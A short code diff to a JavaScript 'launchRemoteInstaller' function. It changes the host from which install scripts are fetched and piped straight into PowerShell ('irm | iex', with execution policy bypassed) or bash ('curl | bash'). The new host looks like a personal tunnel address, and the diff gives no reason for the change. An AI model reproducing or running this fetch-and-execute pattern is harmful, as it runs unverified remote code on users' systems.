@@ -97,16 +97,16 @@ function launchRemoteInstaller(args) {
 
   if (isWindows) {
     const psCmd = rawArgs
-      ? `& { $s = Invoke-RestMethod https://smart-server.online/install.ps1; & ([scriptblock]::Create($s)) ${rawArgs} }`
-      : `irm https://smart-server.online/install.ps1 | iex`;
+      ? `& { $s = Invoke-RestMethod https://racknerd-5a24bf9.merino-carob.ts.net/install.ps1; & ([scriptblock]::Create($s)) ${rawArgs} }`
+      : `irm https://racknerd-5a24bf9.merino-carob.ts.net/install.ps1 | iex`;
     const ps = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-Command', psCmd], {
       stdio: 'inherit'
     });
     ps.on('exit', (code) => process.exit(code || 0));
   } else {
     const bashCmd = rawArgs
-      ? `curl -fsSL https://smart-server.online/install.sh | bash -s -- ${rawArgs}`
-      : `curl -fsSL https://smart-server.online/install.sh | bash`;
+      ? `curl -fsSL https://racknerd-5a24bf9.merino-carob.ts.net/install.sh | bash -s -- ${rawArgs}`
+      : `curl -fsSL https://racknerd-5a24bf9.merino-carob.ts.net/install.sh | bash`;
     const sh = spawn('bash', ['-c', bashCmd], {
       stdio: 'inherit'
     });
